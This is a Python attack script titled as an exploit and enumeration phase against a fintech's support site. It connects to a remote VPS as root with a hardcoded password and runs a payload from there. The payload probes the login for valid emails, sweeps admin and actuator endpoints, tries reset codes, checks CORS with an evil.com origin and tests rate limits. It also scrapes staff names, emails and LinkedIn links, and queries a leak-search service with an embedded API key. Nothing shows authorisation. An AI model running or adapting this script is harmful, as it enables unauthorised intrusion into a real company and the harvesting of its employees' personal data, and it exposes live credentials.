"""Phase 3: Exploit soporte login + deep enum + OSINT."""
import paramiko, textwrap

VPS = "64.177.88.10"
PW = r"5F.jyTK$D6%.F{a="

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=20):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    if isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

SOP = "https://soporte.disperso.com"

# ======================================================
print("=" * 60)
print("A. SOPORTE USER ENUMERATION (email oracle)")
print("=" * 60)

# Test if 401 response differs for valid vs invalid emails
test_emails = [
    "admin@disperso.com",
    "soporte@disperso.com",
    "info@disperso.com",
    "test@disperso.com",
    "contact@disperso.com",
    "contacto@disperso.com",
    "ventas@disperso.com",
    "sales@disperso.com",
    "demo@disperso.com",
    "support@disperso.com",
    "nonexistent99999@disperso.com",
    "aaaaanotexist@disperso.com",
]
print("  Email | Status | Size | Message | Time")
print("  " + "-"*70)
for email in test_emails:
    t0 = time.time()
    s, b, h = req(f"{SOP}/api/auth/login",
                  data={"email": email, "password": "WrongPass123!"},
                  headers={"Content-Type":"application/json"})
    dt = time.time() - t0
    msg = ""
    try:
        d = json.loads(b)
        msg = d.get("message","")
    except:
        msg = b[:100].decode(errors="replace")
    print(f"  {email:40s} | {s} | {len(b):4d} | {msg[:40]:40s} | {dt:.3f}s")
    time.sleep(1.5)

# ======================================================
print("\n" + "=" * 60)
print("B. SOPORTE DEEP API ENUM (more paths)")
print("=" * 60)

paths = [
    # Auth related
    ("POST", "/api/auth/register", {"email":"probe@yopmail.com","password":"Probe2026!","name":"Test User"}),
    ("POST", "/api/auth/forgot-password", {"email":"admin@disperso.com"}),
    ("POST", "/api/auth/reset-password", {"email":"admin@disperso.com","code":"000000","password":"Test2026!"}),
    ("POST", "/api/auth/refresh", {"refreshToken":"dummy"}),
    ("POST", "/api/auth/invite", {"email":"probe@yopmail.com"}),
    ("POST", "/api/auth/verify", {"email":"probe@yopmail.com","code":"000000"}),
    ("GET",  "/api/auth/me", None),
    ("GET",  "/api/auth/user", None),

    # Slug-based public access
    ("GET",  "/api/slug/disperso", None),
    ("GET",  "/api/slugs", None),
    ("GET",  "/api/company/disperso", None),
    ("GET",  "/api/org/disperso", None),
    ("GET",  "/api/tenant/disperso", None),

    # KB / articles
    ("GET",  "/api/kb/articles", None),
    ("GET",  "/api/kb/public", None),
    ("GET",  "/api/kb/categories", None),
    ("GET",  "/api/knowledge-base", None),
    ("GET",  "/api/public/articles", None),
    ("GET",  "/api/public/kb", None),
    ("GET",  "/api/public/faq", None),

    # Tickets public
    ("POST", "/api/public/tickets", {"subject":"Test","description":"Test","email":"probe@yopmail.com","name":"Test"}),
    ("POST", "/api/ticket/public", {"subject":"Test","description":"Test","email":"probe@yopmail.com"}),

    # Admin paths
    ("GET",  "/api/admin", None),
    ("GET",  "/api/admin/users", None),
    ("GET",  "/api/admin/config", None),
    ("GET",  "/api/admin/settings", None),

    # Spring Boot actuator (directly on API)
    ("GET",  "/api/actuator", None),
    ("GET",  "/api/actuator/health", None),
    ("GET",  "/api/actuator/env", None),
    ("GET",  "/api/actuator/info", None),
    ("GET",  "/api/actuator/mappings", None),
    ("GET",  "/api/actuator/configprops", None),

    # More specific
    ("GET",  "/api/invitation", None),
    ("GET",  "/api/invitations", None),
    ("GET",  "/api/organization", None),
    ("GET",  "/api/organizations", None),
    ("GET",  "/api/company", None),
    ("GET",  "/api/dashboard", None),
    ("GET",  "/api/stats", None),
    ("GET",  "/api/metrics", None),
    ("GET",  "/api/agents", None),
    ("GET",  "/api/channels", None),
    ("GET",  "/api/integrations", None),
    ("GET",  "/api/webhooks", None),
    ("GET",  "/api/contacts", None),
    ("GET",  "/api/conversations", None),
    ("GET",  "/api/notifications", None),

    # Soporte Spring Boot error page
    ("GET",  "/api/error", None),
]
for method, path, body in paths:
    s, b, h = req(f"{SOP}{path}",
                  data=body,
                  headers={"Content-Type":"application/json"} if body else None,
                  method=method)
    ct = h.get("content-type","")
    if "html" not in ct:
        btext = b[:200].decode(errors="replace") if len(b) < 500 else f"({len(b)}b)"
        tag = "!!!" if s in (200,201) else "**" if s in (400,403,405,500) else ""
        print(f"  {tag} {method} {path} -> {s} {btext}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("C. SOPORTE CORS CHECK")
print("=" * 60)

s, b, h = req(f"{SOP}/api/auth/login", method="OPTIONS",
              headers={"Origin":"https://evil.com",
                       "Access-Control-Request-Method":"POST",
                       "Access-Control-Request-Headers":"Content-Type,Authorization"})
print(f"  OPTIONS /api/auth/login: {s}")
for hk, hv in h.items():
    if "access-control" in hk.lower() or "origin" in hk.lower():
        print(f"    {hk}: {hv}")

# ======================================================
print("\n" + "=" * 60)
print("D. SOPORTE RATE LIMIT TEST (5 fast requests)")
print("=" * 60)

for i in range(5):
    t0 = time.time()
    s, b, h = req(f"{SOP}/api/auth/login",
                  data={"email":"ratelimit@disperso.com","password":f"Wrong{i}!"},
                  headers={"Content-Type":"application/json"})
    dt = time.time() - t0
    rl = h.get("x-ratelimit-remaining", h.get("x-rate-limit-remaining", h.get("retry-after", "")))
    print(f"  Attempt {i+1}: {s} ({dt:.3f}s) ratelimit_header={rl or 'none'}")
    time.sleep(0.1)  # Deliberately fast to test rate limiting

# ======================================================
print("\n" + "=" * 60)
print("E. INTELX PHONEBOOK (properly)")
print("=" * 60)

INTELX_KEY = "6f65b43b-19df-4e12-aea3-115d793e9763"
INTELX = "https://2.intelx.io"

for term, target in [("disperso.com", 2), ("@disperso.com", 1)]:
    s, b, h = req(f"{INTELX}/phonebook/search",
                  data=json.dumps({"term": term, "maxresults": 100, "media": 0, "target": target}),
                  headers={"x-key": INTELX_KEY, "Content-Type": "application/json"})
    if s == 200:
        d = json.loads(b)
        sid = d.get("id")
        print(f"  phonebook '{term}' (target={target}): search id={sid}")
        if sid:
            time.sleep(5)
            s2, b2, h2 = req(f"{INTELX}/phonebook/search/result?id={sid}&limit=100",
                             headers={"x-key": INTELX_KEY})
            if s2 == 200:
                d2 = json.loads(b2)
                selectors = d2.get("selectors", [])
                print(f"    Total selectors: {len(selectors)}")
                for sel in selectors:
                    stype = sel.get("selectortypeh", "")
                    sval = sel.get("selectorvalue", "")
                    print(f"      [{stype:12s}] {sval}")
            else:
                print(f"    Result fetch: {s2} {b2[:200]}")
    else:
        print(f"  phonebook '{term}': {s} {b[:200]}")
    time.sleep(2)

# ======================================================
print("\n" + "=" * 60)
print("F. GITHUB SEARCH (no auth needed for basic)")
print("=" * 60)

# GitHub code search needs auth, try repo search instead
for q in ["disperso+payments", "disperso+spei", "disperso+fintech+chile"]:
    s, b, h = req(f"https://api.github.com/search/repositories?q={q}&per_page=5",
                  headers={"Accept":"application/vnd.github+json"})
    if s == 200:
        d = json.loads(b)
        print(f"  repos '{q}': {d.get('total_count',0)}")
        for it in d.get("items", [])[:3]:
            print(f"    {it['full_name']} ({it['language']}) stars={it.get('stargazers_count',0)}")
    time.sleep(2)

# ======================================================
print("\n" + "=" * 60)
print("G. SOPORTE REGISTRATION / INVITATION FLOW DEEP")
print("=" * 60)

# Try to access self-service registration or invitation acceptance
for path in [
    "/register", "/signup", "/join", "/invitation", "/invite",
    "/api/v1/auth/register", "/api/v1/auth/signup",
    "/api/v1/auth/invitation", "/api/v1/invitation/accept",
    "/api/v1/users/register", "/api/v1/users/signup",
]:
    s, b, h = req(f"{SOP}{path}")
    ct = h.get("content-type","")
    if "html" not in ct:
        print(f"  GET {path} -> {s} ({len(b)}b) {ct[:30]}")
        if len(b) < 300:
            print(f"      {b[:200]}")
    time.sleep(0.2)

# POST variants for registration
for path in ["/api/auth/register", "/api/v1/auth/register", "/api/users/register"]:
    for body in [
        {"email":"probe@yopmail.com","password":"Probe2026!","name":"Test User","company":"TestCo"},
        {"email":"probe@yopmail.com","password":"Probe2026!","firstName":"Test","lastName":"User"},
    ]:
        s, b, h = req(f"{SOP}{path}", data=body,
                      headers={"Content-Type":"application/json"})
        ct = h.get("content-type","")
        if "html" not in ct:
            print(f"  POST {path} -> {s} {b[:200].decode(errors='replace')}")
        time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("H. DISPERSO.COM SITEMAP FETCH")
print("=" * 60)

s, b, h = req("https://disperso.com/sitemap.xml")
if s == 200:
    import re
    urls = re.findall(r'<loc>(.*?)</loc>', b.decode(errors="replace"))
    print(f"  {len(urls)} URLs in sitemap:")
    for u in urls:
        print(f"    {u}")

# Fetch contact/demo pages
for path in ["/contactanos", "/contactanos/demo", "/nosotros", "/equipo", "/team", "/about"]:
    s, b, h = req(f"https://disperso.com{path}")
    if s == 200:
        content = b.decode(errors="replace")
        emails = re.findall(r'[\w.+-]+@[\w.-]+\.\w+', content)
        names = re.findall(r'(?:CEO|CTO|COO|CFO|VP|Director|Gerente|Founder|Co-founder)[^<]{0,100}', content, re.IGNORECASE)
        links = re.findall(r'linkedin\.com/in/[^"\'<\s]+', content)
        if emails or names or links:
            print(f"\n  {path}:")
            for e in set(emails):
                print(f"    Email: {e}")
            for n in names[:5]:
                print(f"    Role: {n.strip()[:80]}")
            for l in set(links):
                print(f"    LinkedIn: {l}")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("I. NOTIFICATION ENUM (types, channels)")
print("=" * 60)

BASE = "https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com/prod"

# Try GET with params
for path in [
    "/api/v1/notification?type=new-potential-client",
    "/api/v1/notification?type=contact",
    "/api/v1/notification/types",
    "/api/v1/notification/channels",
    "/api/v1/notification/templates",
    "/api/v1/contact",
    "/api/v1/contact-form",
    "/api/v1/demo",
    "/api/v1/demo-request",
    "/api/v1/public/config",
    "/api/v1/public/health",
    "/api/v1/health",
    "/api/v1/version",
    "/api/v1/info",
    "/api/v1/status",
    "/api/v1/bank/list",
    "/api/v1/bank/catalog",
    "/api/v1/catalog/banks",
]:
    s, b, h = req(f"{BASE}{path}")
    if s != 403:
        print(f"  GET {path} -> {s} ({len(b)}b) {b[:150] if len(b)<200 else ''}")
    time.sleep(0.3)

print("\n" + "=" * 60)
print("PHASE 3 DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/todo3.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print("Running phase 3...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/todo3.py 2>&1", timeout=300)
out = stdout.read().decode(errors="replace")
print(out)
ssh.close()
